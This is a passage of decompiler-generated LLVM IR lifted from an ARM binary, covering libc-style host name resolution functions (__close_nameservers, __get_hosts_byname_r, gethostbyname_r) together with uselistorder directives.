  %v2_11af0 = xor i1 %v2_11ae8, true
  call void @__pseudo_cond_branch(i1 %v2_11af0, i32 %v4_11ae4)
  %v2_11af8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11af8, i32* %r4.global-to-local, align 4
  store i32 %v15_116ec, i32* @r8, align 4
  store i32 %v18_116ec, i32* @sb, align 4
  store i32 %v21_116ec, i32* @sl, align 4
  store i32 %v24_116ec, i32* @fp, align 4
  store i32 %v27_116ec, i32* %lr.global-to-local, align 4
  ret i32 %v4_11ae4

; uselistorder directives
  uselistorder i32 %v1_11ab0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11a60, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_117f0, { 1, 0 }
  uselistorder i32 %v2_117d8, { 1, 0 }
  uselistorder i32 %v2_117b8, { 1, 0 }
  uselistorder i32 %v2_119e0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_119b0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_119a0, { 1, 0 }
  uselistorder i32 %v0_11940, { 1, 0, 2 }
  uselistorder i32 %v1_118b817, { 1, 0 }
  uselistorder i32 %v1_118b010, { 1, 0 }
  uselistorder i32 %v0_118b09, { 1, 0 }
  uselistorder i32 %v1_118b8, { 1, 0 }
  uselistorder i32 %v3_11834, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 21, 27, 12, 13, 14, 28, 17, 15, 16, 18, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 15, 12, 4, 17, 5, 16, 6, 7, 8, 9, 10, 11, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 5, 7, 9, 8, 11, 10, 56, 55, 0, 54, 48, 47, 12, 14, 13, 16, 15, 17, 19, 18, 21, 20, 22, 23, 25, 24, 26, 28, 27, 33, 32, 29, 30, 31, 35, 34, 37, 36, 38, 40, 39, 41, 43, 42, 44, 46, 45, 51, 49, 50, 53, 52 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 2, 4, 1, 0, 3 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3 }
  uselistorder i32 (i32*, i32)* @realloc, { 1, 2, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 -37396, { 1, 0 }
  uselistorder i32 727, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 -37280, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37280), { 1, 0 }
  uselistorder i32 10468, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_11ae0, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a50, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_11a04, { 1, 0 }
  uselistorder label %dec_label_pc_119fc, { 1, 0 }
  uselistorder label %dec_label_pc_119e0.backedge, { 3, 10, 8, 7, 9, 0, 1, 2, 4, 6, 5 }
  uselistorder label %dec_label_pc_118c0, { 1, 0 }
  uselistorder label %dec_label_pc_1173c, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11b48 = load i32, i32* @r4, align 4
  store i32 %v3_11b48, i32* %stack_var_-20, align 4
  store i32 10476, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  store i32 -37204, i32* %r3.global-to-local, align 4
  %v4_11b5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 10476) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37204), i32* %r3.global-to-local, align 4
  store i32 72560, i32* @lr, align 4
  %v1_11b6c = icmp ne i32 %v4_11b5c, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37204)
  call void @__pseudo_cond_branch(i1 %v1_11b6c, i32 ptrtoint (i32* @global_var_bd70.236 to i32))
  store i32 10480, i32* %r3.global-to-local, align 4
  store i32 10484, i32* @r7, align 4
  store i32 10472, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_11b80 = load i32, i32* @r5, align 4
  %v3_11b80 = add i32 %v1_11b80, 10480
  %v4_11b80 = inttoptr i32 %v3_11b80 to i32*
  store i32 0, i32* %v4_11b80, align 4
  %v0_11b84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b84 = load i32, i32* @r5, align 4
  %v2_11b84 = load i32, i32* %r4.global-to-local, align 4
  %v3_11b84 = add i32 %v2_11b84, %v1_11b84
  %v4_11b84 = inttoptr i32 %v3_11b84 to i32*
  store i32 %v0_11b84, i32* %v4_11b84, align 4
  br label %dec_label_pc_11b9c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11b9c
  store i32 %v4_11bb0, i32* %r3.global-to-local, align 4
  store i32 %v1_11ba4, i32* %v3_11b9c, align 4
  %v0_11b94 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b94 = load i32, i32* %r2.global-to-local, align 4
  %v4_11b94 = mul i32 %v1_11b94, 4
  %v5_11b94 = add i32 %v4_11b94, %v0_11b94
  %v6_11b94 = inttoptr i32 %v5_11b94 to i32*
  %v7_11b94 = load i32, i32* %v6_11b94, align 4
  store i32 %v7_11b94, i32* @r0, align 4
  %v0_11b98 = call i32 @free()
  br label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %entry, %dec_label_pc_11b8c
  %v0_11b9c = load i32, i32* @r5, align 4
  %v1_11b9c = load i32, i32* @r7, align 4
  %v2_11b9c = add i32 %v1_11b9c, %v0_11b9c
  %v3_11b9c = inttoptr i32 %v2_11b9c to i32*
  %v4_11b9c = load i32, i32* %v3_11b9c, align 4
  store i32 %v4_11b9c, i32* @r4, align 4
  %v2_11ba0 = icmp eq i32 %v4_11b9c, 0
  %v1_11ba4 = add i32 %v4_11b9c, -1
  store i32 %v1_11ba4, i32* %r2.global-to-local, align 4
  %v0_11ba8 = load i32, i32* @r6, align 4
  store i32 %v0_11ba8, i32* %r3.global-to-local, align 4
  %v2_11bb0 = add i32 %v0_11ba8, %v0_11b9c
  %v3_11bb0 = inttoptr i32 %v2_11bb0 to i32*
  %v4_11bb0 = load i32, i32* %v3_11bb0, align 4
  br i1 %v2_11ba0, label %dec_label_pc_11bb0, label %dec_label_pc_11b8c

dec_label_pc_11bb0:                               ; preds = %dec_label_pc_11b9c
  store i32 %v4_11bb0, i32* @r0, align 4
  %v0_11bb4 = call i32 @free()
  %v0_11bb8 = load i32, i32* @r4, align 4
  %v1_11bb8 = load i32, i32* @r5, align 4
  %v2_11bb8 = load i32, i32* @r6, align 4
  %v3_11bb8 = add i32 %v2_11bb8, %v1_11bb8
  %v4_11bb8 = inttoptr i32 %v3_11bb8 to i32*
  store i32 %v0_11bb8, i32* %v4_11bb8, align 4
  %v2_11bc0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11bc0, i32* %r4.global-to-local, align 4
  ret i32 %v0_11bb4

; uselistorder directives
  uselistorder i32 %v4_11bb0, { 1, 0 }
  uselistorder i32 %v1_11ba4, { 1, 0 }
  uselistorder i32* %v3_11b9c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 10472, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 10484, { 1, 2, 4, 3, 0 }
  uselistorder i32 10480, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -37204, { 1, 2, 0, 3 }
  uselistorder i32 10476, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_11b9c, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_11be0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_11c1c = call i32 @__read_etc_hosts_r()
  store i32 %v0_11be0, i32* @lr, align 4
  ret i32 %v0_11c1c
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_11c34 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_11c40 = load i32, i32* @r0, align 4
  store i32 %v0_11c40, i32* @sl, align 4
  %v2_11c40 = icmp eq i32 %v0_11c40, 0
  %v2_11c44 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_11c44, align 4
  %v0_11c48 = load i32, i32* @r1, align 4
  store i32 %v0_11c48, i32* @r7, align 4
  %v0_11c4c = load i32, i32* @r3, align 4
  store i32 %v0_11c4c, i32* @r6, align 4
  br i1 %v2_11c40, label %bb, label %dec_label_pc_11c58

bb:                                               ; preds = %entry
  %v1_11c50 = load i32, i32* @r5, align 4
  %v2_11c50 = add i32 %v1_11c50, 22
  store i32 %v2_11c50, i32* @r5, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11c58:                               ; preds = %entry
  %v0_11c58 = call i32 @__GI___errno_location()
  store i32 %v0_11c58, i32* %r0.global-to-local, align 4
  %v3_11c5c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_11c5c, i32* %ip.global-to-local, align 4
  %v1_11c60 = inttoptr i32 %v0_11c58 to i32*
  %v2_11c60 = load i32, i32* %v1_11c60, align 4
  store i32 %v2_11c60, i32* @r8, align 4
  %v0_11c64 = load i32, i32* @r5, align 4
  store i32 %v0_11c64, i32* %v1_11c60, align 4
  %v0_11c68 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_11c58, i32* @r4, align 4
  %v0_11c78 = load i32, i32* @sl, align 4
  store i32 %v0_11c78, i32* %r0.global-to-local, align 4
  %v0_11c7c = load i32, i32* @r7, align 4
  store i32 %v0_11c7c, i32* %r2.global-to-local, align 4
  store i32 %v0_11c34, i32* %r3.global-to-local, align 4
  %v0_11c84 = load i32, i32* @r6, align 4
  %v7_11c8c = call i32 @__get_hosts_byname_r(i32 %v0_11c78, i32 2, i32 %v0_11c7c, i32 %v0_11c34, i32 %v0_11c84, i32 %v0_11c68, i32 %tmp18)
  store i32 %v7_11c8c, i32* %r0.global-to-local, align 4
  store i32 %v7_11c8c, i32* @r5, align 4
  %v2_11c90 = icmp eq i32 %v7_11c8c, 0
  br i1 %v2_11c90, label %bb34, label %dec_label_pc_11c9c

bb34:                                             ; preds = %dec_label_pc_11c58
  %v1_11c94 = load i32, i32* @r8, align 4
  %v2_11c94 = load i32, i32* @r4, align 4
  %v3_11c94 = inttoptr i32 %v2_11c94 to i32*
  store i32 %v1_11c94, i32* %v3_11c94, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c58
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_11ca0 = inttoptr i32 %tmp18 to i32*
  %v2_11ca0 = load i32, i32* %v1_11ca0, align 4
  store i32 %v2_11ca0, i32* %r3.global-to-local, align 4
  %v7_11ca4 = icmp eq i32 %v2_11ca0, 1
  br i1 %v7_11ca4, label %dec_label_pc_11cc0, label %dec_label_pc_11cac

dec_label_pc_11cac:                               ; preds = %dec_label_pc_11c9c
  %v7_11cac = icmp eq i32 %v2_11ca0, 4
  br i1 %v7_11cac, label %dec_label_pc_11ce0, label %dec_label_pc_11cb4

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11cac
  %v3_11cb4 = icmp eq i32 %v2_11ca0, -1
  br i1 %v3_11cb4, label %dec_label_pc_11cd4, label %dec_label_pc_11f14

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11c9c
  %v7_11cc0 = icmp eq i32 %v7_11c8c, 2
  br i1 %v7_11cc0, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_11cc0
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11ce8

.thread4:                                         ; preds = %dec_label_pc_11cc0
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cb4
  %v0_11cd4 = load i32, i32* @r4, align 4
  %v1_11cd4 = inttoptr i32 %v0_11cd4 to i32*
  %v2_11cd4 = load i32, i32* %v1_11cd4, align 4
  store i32 %v2_11cd4, i32* %r3.global-to-local, align 4
  %v7_11cd8 = icmp eq i32 %v2_11cd4, 2
  br i1 %v7_11cd8, label %dec_label_pc_11ce0, label %dec_label_pc_11f14

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cd4, %dec_label_pc_11cac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %.thread4, %bb35, %dec_label_pc_11ce0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_11ce0 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_11cf0 = load i32, i32* @r8, align 4
  %v1_11cf0 = load i32, i32* @r4, align 4
  %v2_11cf0 = inttoptr i32 %v1_11cf0 to i32*
  store i32 %v0_11cf0, i32* %v2_11cf0, align 4
  %v0_11cf4 = load i32, i32* @sl, align 4
  %v1_11cf4 = inttoptr i32 %v0_11cf4 to i8*
  store i32 %v0_11cf4, i32* %r0.global-to-local, align 4
  %v0_11cf8 = load i32, i32* @r3, align 4
  %v1_11cf8 = load i32, i32* @ip, align 4
  %v2_11cf8 = inttoptr i32 %v1_11cf8 to i32*
  store i32 %v0_11cf8, i32* %v2_11cf8, align 4
  %v3_11cfc = call i32 @strlen(i8* %v1_11cf4)
  store i32 %v3_11cfc, i32* %r0.global-to-local, align 4
  %v1_11d00 = add i32 %v3_11cfc, 1
  store i32 %v1_11d00, i32* @r4, align 4
  %v0_11d04 = load i32, i32* @r6, align 4
  %v7_11d08 = icmp sgt i32 %v0_11d04, %v1_11d00
  br i1 %v7_11d08, label %dec_label_pc_11d0c, label %dec_label_pc_11f10

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11ce8
  %v0_11d0c = load i32, i32* @sl, align 4
  store i32 %v0_11d0c, i32* @r1, align 4
  store i32 %v1_11d00, i32* @r2, align 4
  store i32 %v0_11c34, i32* @r0, align 4
  %v0_11d18 = call i32 @memcpy()
  store i32 %v0_11d18, i32* %r0.global-to-local, align 4
  %v1_11d20 = load i32, i32* @r4, align 4
  %v2_11d20 = add i32 %v1_11d20, %v0_11c34
  %v1_11d24 = sub i32 0, %v2_11d20
  %v1_11d28 = load i32, i32* @r6, align 4
  %v2_11d28 = sub i32 %v1_11d28, %v1_11d20
  store i32 %v2_11d28, i32* %r2.global-to-local, align 4
  %v1_11d2c = urem i32 %v1_11d24, 4
  store i32 %v1_11d2c, i32* %r3.global-to-local, align 4
  %v2_11d30 = sub i32 %v2_11d28, %v1_11d2c
  store i32 %v2_11d30, i32* @sb, align 4
  %v1_11d34 = add i32 %v2_11d30, -8
  store i32 %v1_11d34, i32* @r5, align 4
  %v7_11d3c = icmp slt i32 %v1_11d34, 256
  br i1 %v7_11d3c, label %dec_label_pc_11f10, label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d0c
  %v2_11d40 = add i32 %v1_11d2c, %v2_11d20
  store i32 %v2_11d40, i32* @fp, align 4
  store i32 %v0_11c34, i32* %ip.global-to-local, align 4
  %v1_11d48 = add i32 %v2_11d40, 8
  store i32 %v1_11d48, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_11d50 = add i32 %v2_11d40, 16
  store i32 %v1_11d50, i32* @r8, align 4
  %v4_11d54 = inttoptr i32 %v2_11d40 to i32*
  store i32 %v0_11c34, i32* %v4_11d54, align 4
  %v0_11d58 = load i32, i32* @sl, align 4
  store i32 %v0_11d58, i32* %r0.global-to-local, align 4
  %v0_11d5c = load i32, i32* @r4, align 4
  %v1_11d5c = load i32, i32* @fp, align 4
  %v2_11d5c = add i32 %v1_11d5c, 4
  %v3_11d5c = inttoptr i32 %v2_11d5c to i32*
  store i32 %v0_11d5c, i32* %v3_11d5c, align 4
  %v0_11d60 = load i32, i32* @r8, align 4
  %v2_11d64 = inttoptr i32 %v0_11d58 to i8*
  %v3_11d64 = call i32 @inet_aton(i8* %v2_11d64, i32 %v0_11d60)
  store i32 %v3_11d64, i32* %r0.global-to-local, align 4
  %v1_11d68 = load i32, i32* @r4, align 4
  %v9_11d68 = icmp eq i32 %v3_11d64, %v1_11d68
  br i1 %v9_11d68, label %dec_label_pc_11dac, label %dec_label_pc_11d70

dec_label_pc_11d70:                               ; preds = %dec_label_pc_11d40
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_11d74 = load i32, i32* @r7, align 4
  %v2_11d74 = add i32 %v1_11d74, 8
  %v3_11d74 = inttoptr i32 %v2_11d74 to i32*
  store i32 2, i32* %v3_11d74, align 4
  %v0_11d78 = load i32, i32* %r3.global-to-local, align 4
  %v2_11d78 = mul i32 %v0_11d78, 2
  %v1_11d7c = load i32, i32* @r7, align 4
  %v2_11d7c = add i32 %v1_11d7c, 12
  %v3_11d7c = inttoptr i32 %v2_11d7c to i32*
  store i32 %v2_11d78, i32* %v3_11d7c, align 4
  %v3_11d80 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_11d80, i32* %r2.global-to-local, align 4
  store i32 %v0_11c34, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_11d8c = load i32, i32* @r4, align 4
  store i32 %v0_11d8c, i32* @r5, align 4
  %v0_11d90 = load i32, i32* @r8, align 4
  %v1_11d90 = load i32, i32* @fp, align 4
  %v2_11d90 = add i32 %v1_11d90, 8
  %v3_11d90 = inttoptr i32 %v2_11d90 to i32*
  store i32 %v0_11d90, i32* %v3_11d90, align 4
  %v0_11d94 = load i32, i32* @r7, align 4
  %v1_11d94 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  store i32 %v0_11d94, i32* %v2_11d94, align 4
  %v0_11d98 = load i32, i32* @r7, align 4
  %v1_11d98 = inttoptr i32 %v0_11d98 to i32*
  %v2_11d98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_11d98, i32* %v1_11d98, align 4
  %v3_11d98 = add i32 %v0_11d98, 4
  %v4_11d98 = inttoptr i32 %v3_11d98 to i32*
  %v5_11d98 = load i32, i32* @fp, align 4
  store i32 %v5_11d98, i32* %v4_11d98, align 4
  %v0_11d9c = load i32, i32* @r6, align 4
  %v1_11d9c = load i32, i32* @r7, align 4
  %v2_11d9c = add i32 %v1_11d9c, 16
  %v3_11d9c = inttoptr i32 %v2_11d9c to i32*
  store i32 %v0_11d9c, i32* %v3_11d9c, align 4
  %v0_11da0 = load i32, i32* @r4, align 4
  %v1_11da0 = load i32, i32* @ip, align 4
  %v2_11da0 = inttoptr i32 %v1_11da0 to i32*
  store i32 %v0_11da0, i32* %v2_11da0, align 4
  %v0_11da4 = load i32, i32* @r4, align 4
  %v1_11da4 = load i32, i32* @r6, align 4
  %v2_11da4 = add i32 %v1_11da4, 4
  %v3_11da4 = inttoptr i32 %v2_11da4 to i32*
  store i32 %v0_11da4, i32* %v3_11da4, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11d40
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_11db0 = icmp eq i32 %storemerge2, 0
  br i1 %v2_11db0, label %dec_label_pc_11dc8, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11dac
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_11ca0, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11dc8:                               ; preds = %dec_label_pc_11dac
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_11dd4 = load i32, i32* @sl, align 4
  store i32 %v0_11dd4, i32* %r0.global-to-local, align 4
  %v2_11ddc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_11ddc, i32* %r2.global-to-local, align 4
  %v2_11de0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_11de0, i32* %r3.global-to-local, align 4
  %v7_11dec = inttoptr i32 %v0_11dd4 to i8*
  %v8_11dec = call i32 @__dns_lookup(i8* %v7_11dec, i32 1, i32 %v2_11ddc, i32 %v2_11de0)
  store i32 %v8_11dec, i32* %r0.global-to-local, align 4
  %v1_11df0 = icmp slt i32 %v8_11dec, 0
  br i1 %v1_11df0, label %.thread, label %dec_label_pc_11e08

.thread:                                          ; preds = %dec_label_pc_11dc8
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_11ca0, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11e08:                               ; preds = %dec_label_pc_11dc8
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_11e0c = icmp eq i32 %tmp12, 1
  br i1 %v7_11e0c, label %dec_label_pc_11e14, label %dec_label_pc_11eec

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11e08
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_11e2c = load i32, i32* @r5, align 4
  %v2_11e2c = add i32 %v0_11e2c, -12
  store i32 %v2_11e2c, i32* @r8, align 4
  %v8_11e2c = icmp slt i32 %v2_11e2c, 0
  br i1 %v8_11e2c, label %bb37, label %dec_label_pc_11e38

bb37:                                             ; preds = %dec_label_pc_11e14
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_11efc

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e14
  %v0_11e38 = load i32, i32* @r6, align 4
  store i32 %v0_11e38, i32* @r1, align 4
  %v2_11e3c = add i32 %v0_11e38, 12
  store i32 %v2_11e3c, i32* @r0, align 4
  %v2_11e40 = call i32 @memmove(i32 %v2_11e3c, i32 %v0_11e38)
  %v0_11e44 = load i32, i32* @fp, align 4
  %v1_11e44 = add i32 %v0_11e44, 4
  store i32 %v1_11e44, i32* @r3, align 4
  %v1_11e48 = load i32, i32* @r4, align 4
  %v2_11e48 = add i32 %v1_11e48, %v1_11e44
  store i32 %v2_11e48, i32* @r5, align 4
  store i32 %v2_11e48, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_11e58 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11e64.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e64, %dec_label_pc_11e38
  %v0_11e64 = phi i32 [ %v0_11e64.pre, %dec_label_pc_11e38 ], [ %v1_11e68, %dec_label_pc_11e64 ]
  %v1_11e64 = load i32, i32* @r6, align 4
  %v7_11e64 = inttoptr i32 %v1_11e64 to i32*
  store i32 %v0_11e64, i32* %v7_11e64, align 4
  %v0_11e68 = load i32, i32* @r5, align 4
  %v1_11e68 = add i32 %v0_11e68, 4
  store i32 %v1_11e68, i32* @r5, align 4
  %v0_11e6c = load i32, i32* %r0.global-to-local, align 4
  %v1_11e6c = add i32 %v0_11e6c, 1
  store i32 %v1_11e6c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_11e6c, 0
  br i1 %tmp38, label %dec_label_pc_11e64, label %dec_label_pc_11e7c

dec_label_pc_11e7c:                               ; preds = %dec_label_pc_11e64
  %v3_11e7c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_11e7c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11e84 = icmp eq i32 %v3_11e7c, 0
  %v1_11e88 = load i32, i32* @r6, align 4
  %v5_11e88 = mul i32 %v1_11e6c, 4
  %v6_11e88 = add i32 %v1_11e88, %v5_11e88
  %v7_11e88 = inttoptr i32 %v6_11e88 to i32*
  store i32 0, i32* %v7_11e88, align 4
  br i1 %v2_11e84, label %dec_label_pc_11eb8, label %dec_label_pc_11e90

dec_label_pc_11e90:                               ; preds = %dec_label_pc_11e7c
  %v0_11e90 = load i32, i32* @r4, align 4
  %v1_11e90 = inttoptr i32 %v0_11e90 to i8*
  store i32 %v0_11e90, i32* %r0.global-to-local, align 4
  %v3_11e94 = call i32 @strlen(i8* %v1_11e90)
  store i32 %v3_11e94, i32* %r0.global-to-local, align 4
  %v0_11e98 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_11e98, %v3_11e94
  br i1 %tmp, label %dec_label_pc_11ea0, label %dec_label_pc_11eb8

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e90
  %v0_11ea0 = load i32, i32* @r4, align 4
  store i32 %v0_11ea0, i32* @r1, align 4
  %v0_11ea4 = load i32, i32* @r5, align 4
  store i32 %v0_11ea4, i32* %r0.global-to-local, align 4
  %v2_11ea8 = inttoptr i32 %v0_11ea4 to i8*
  %v3_11ea8 = call i32 @strcpy(i8* %v2_11ea8, i32 %v0_11ea0)
  store i32 %v3_11ea8, i32* %r0.global-to-local, align 4
  %v0_11eac = load i32, i32* @r5, align 4
  br label %dec_label_pc_11eb8

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11e90, %dec_label_pc_11e7c, %dec_label_pc_11ea0
  %storemerge1 = phi i32 [ %v0_11eac, %dec_label_pc_11ea0 ], [ %v0_11c34, %dec_label_pc_11e90 ], [ %v0_11c34, %dec_label_pc_11e7c ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_11ebc = load i32, i32* @r7, align 4
  %v2_11ebc = add i32 %v1_11ebc, 8
  %v3_11ebc = inttoptr i32 %v2_11ebc to i32*
  store i32 2, i32* %v3_11ebc, align 4
  %v0_11ec0 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ec0 = mul i32 %v0_11ec0, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11ec8 = load i32, i32* @r7, align 4
  %v2_11ec8 = add i32 %v1_11ec8, 12
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i32*
  store i32 %v2_11ec0, i32* %v3_11ec8, align 4
  %v3_11ecc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_11ecc, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_11ed4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11ed4, i32* @r5, align 4
  %v0_11ed8 = load i32, i32* @r7, align 4
  %v2_11ed8 = inttoptr i32 %v3_11ecc to i32*
  store i32 %v0_11ed8, i32* %v2_11ed8, align 4
  %v0_11edc = load i32, i32* @r7, align 4
  %v1_11edc = inttoptr i32 %v0_11edc to i32*
  %v2_11edc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_11edc, i32* %v1_11edc, align 4
  %v3_11edc = add i32 %v0_11edc, 4
  %v4_11edc = inttoptr i32 %v3_11edc to i32*
  %v5_11edc = load i32, i32* @fp, align 4
  store i32 %v5_11edc, i32* %v4_11edc, align 4
  %v0_11ee0 = load i32, i32* @r6, align 4
  %v1_11ee0 = load i32, i32* @r7, align 4
  %v2_11ee0 = add i32 %v1_11ee0, 16
  %v3_11ee0 = inttoptr i32 %v2_11ee0 to i32*
  store i32 %v0_11ee0, i32* %v3_11ee0, align 4
  %v0_11ee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ee4 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ee4 = inttoptr i32 %v1_11ee4 to i32*
  store i32 %v0_11ee4, i32* %v2_11ee4, align 4
  br label %dec_label_pc_11efc

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11e08
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_11ca0, align 4
